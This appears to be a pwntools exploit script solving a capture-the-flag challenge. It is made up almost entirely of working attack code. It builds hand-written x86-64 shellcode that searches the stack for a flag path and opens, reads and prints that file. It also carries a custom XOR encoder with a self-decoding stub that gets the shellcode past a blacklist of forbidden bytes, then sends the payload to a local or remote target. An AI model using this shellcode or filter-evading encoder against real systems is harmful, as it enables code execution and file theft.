# pretty low chances to win but it does
from pwn import *
#elf = context.binary = ELF("asg_patched")
elf = context.binary = ELF("/home/asg/asg")
if args.REMOTE:
    r = remote("0.0.0.0",9025)
else:
    r = process("./asg_p")

def encoder(payload, bl):
    payload_size = len(payload)
    assert payload_size % 4 == 0, r.warn("Shellcode must be a multiple of 4")
    rip_offset = 10*((payload_size // 4)-1)
    print(hex(rip_offset))
    critical_bytes = [0x81, 0x35, rip_offset & 0xff, rip_offset >> 8, 0x00, 0x90]
    r.info(f"Shellcode size: 0x{payload_size:02x}")

    for crit in critical_bytes:
        if crit in bl:
            r.warn(f"Encoder byte {hex(crit)} blacklisted, try again.")
            exit(1)
    r.success("Encoder bytes are whitelisted.")

    stub = b""
    encoded_sc = b""
    wl_bytes = b""

    # Encode code
    for idx in range(len(payload)):
        val_found = False
        for val in range(256):
            # val cant be blacklisted
            if val in bl:
                continue
            # encode cant be blacklisted
            if (payload[idx] ^ val) in bl:
                continue
            # encode this
            wl_bytes += bytes([val])
            encoded_sc += bytes([payload[idx] ^ val])
            # break loop
            val_found = True
            break
        # check that its not impossible
        if not val_found:
            r.warn("value not found for encoding")
            exit(1)
        # load chunk and align
        if (idx+1) % 4 == 0 and idx != 0:
            stub += b"\x81\x35" + bytes([rip_offset & 0xff, rip_offset >> 8]) + b"\x00\x00" + wl_bytes
            encoded_sc += b"\x90" * 6 # padding nops
            wl_bytes = b""

    # return stub + encoded bytes
    final_sc = stub + encoded_sc
    final_sc_sz = len(final_sc)
    assert final_sc_sz <= 1000, r.warn(f"Shellcode too long: {final_sc_sz} bytes")
    return final_sc

# ---- Exploit ----
r.send(b"x")

r.recvuntil(b"set of bytes:")
blacklist = r.recv(0x80)
#r.info("Blacklist: " + binascii.hexlify(blacklist,sep=',').decode())

r.recvuntil(b"this file: ");
flag_filename = r.recvline().strip()[1:-1]

r.info(f"flag file: {flag_filename}")

### find the flag location in the stack
## stack top
# mov rsi, rsp
find_sc = b"H\x89\xe6\x90"
## anchor 'flagbox/'
find_sc += b"\x66\xb8\x78\x2f" # mov ax, 0x782f
find_sc += b"H\xc1\xe0\x10"    # shl rax, 16
find_sc += b"\x66\x0d\x62\x6f" # or ax, 0x626f 
find_sc += b"H\xc1\xe0\x10"
find_sc += b"\x66\x0d\x61\x67" # or ax, 0x6167
find_sc += b"H\xc1\xe0\x10"
find_sc += b"\x66\x0d\x66\x6c" # or ax, 0x666c
## tag: loop
# cmp [rsi], rax
find_sc += b"H9\x06\x90"
# je end (je + 22)
find_sc += b"t\x14\x90\x90"
# sub rsi, 8
find_sc += b"H\x83\xee\x08"
# pop rsi
#find_sc += b"^\x90\x90\x90"
# jmp loop (jmp - 30)
find_sc += b"\xeb\xe0\x90\x90"
## tag: end


# mov rdi, rsi; xor rsi, rsi; xor rax, rax; mov al, 2; syscall
open_sc = b"H\x89\xf7\x90" + b"H1\xc0\x90" + b"H1\xf6\x90" + b"\xb0\x02\x0f\x05" 

# push rax ; pop rdi ; mov dl, 136 ; xor rax, rax ; mov rsi, rsp ; syscall
read_sc = b"P_\xb2\x88" + b"H1\xc0\x90" + b"H\x89\xe6\x90" + b"\x0f\x05\x90\x90"

# xor rax, rax ; inc rax; push rax ; pop rdi ; mov rsi, rsp ; syscall
# ! rdx is already 136
write_sc = b"H1\xc0\x90" + b"H\xff\xc0P" + b"_H\x89\xe6" + b"\x0f\x05\x90\x90"

shellcode = find_sc + open_sc + read_sc + write_sc
r.info("Shellcode: " + binascii.hexlify(shellcode).decode())

encoded_sc = encoder(shellcode, blacklist)

r.info("Encoded shellcode: " + binascii.hexlify(encoded_sc).decode())

r.info(f"Encoded shellcode size: 0x{len(encoded_sc):02x}")
pause()
r.sendafter(b"your shellcode: ", encoded_sc)

r.interactive()
